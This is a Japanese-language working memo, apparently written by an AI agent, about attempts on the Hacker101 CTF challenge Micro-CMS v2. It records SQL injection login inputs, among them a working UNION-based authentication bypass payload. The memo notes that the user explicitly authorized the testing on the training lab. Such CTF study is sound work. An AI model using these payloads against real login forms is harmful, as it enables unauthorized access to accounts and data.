# Micro-CMS v2 — 調査メモ

- 実施日: 2026-10-29
- 対象: [Hacker101 CTF の Micro-CMS v2](https://ctf.hacker101.com/ctf)
- 状態: 実験環境は起動済み。認証回避に成功し、「Private Page」のリンクを確認。フラグ提出は 0/3
- 課題インスタンスのホスト名、セッション情報、フラグ値は公開しない

## 確認したこと

1. v1 の実験環境が起動中は、v2 の Start リンクが無効だった。v1 を終了すると v2 を起動できた。
2. v2 のトップページには「Micro-CMS Changelog」と「Markdown Test」、新規ページ作成リンクがある。
3. Changelog には、v1 の欠陥を修正し、ユーザー認証を追加したと書かれている。既定ではページの追加・編集に管理者権限が必要。
4. 未認証の状態で「Edit this page」を開くと、ログイン画面へ転送された。
5. 未認証で `/page/3` を開くと 403 Forbidden だった。公式ヒントには「Regular users can only see public pages」とある。

## ログイン入力の検証

本人が「学習用 CTF の Micro-CMS v2 のログインフォームで SQL インジェクションによる認証回避を試してよい」と明示的に承認した後で実施した。

- `' OR 1=1--` は 500 Internal Server Error。
- `admin' -- ` と通常の `admin` は「Unknown user」。
- `' OR 1=1 LIMIT 1-- ` は「Invalid password」。ユーザー名の照会結果が変わることを確認した。
- 次の入力をユーザー名、`pass` をパスワードに指定すると「Logged In!」となった。

```sql
' UNION SELECT 'pass' AS password FROM admins WHERE '1' = '1
```

その後のホーム画面には「Private Page」(`/page/3`) のリンクが現れた。SQL インジェクションで認証状態が変わったことを画面で確認した。ページ本文とフラグはまだ未確認。

この UNION 入力は [公開 writeup](https://github.com/ternera/hacker101-ctf/blob/main/Micro-CMS%20v2.md) を手掛かりにし、今回の課題インスタンスで実際に検証した。内部の SQL 実装は未確認。

## 停止理由と次の手順

「Go Home」の操作がタイムアウトした。状態を 1 回だけ確認すると、ログイン済みのホーム画面と「Private Page」リンクが表示されていた。ブラウザ操作をそこで停止した。

次回は `/page/3` の本文を確認し、フラグがあれば提出する。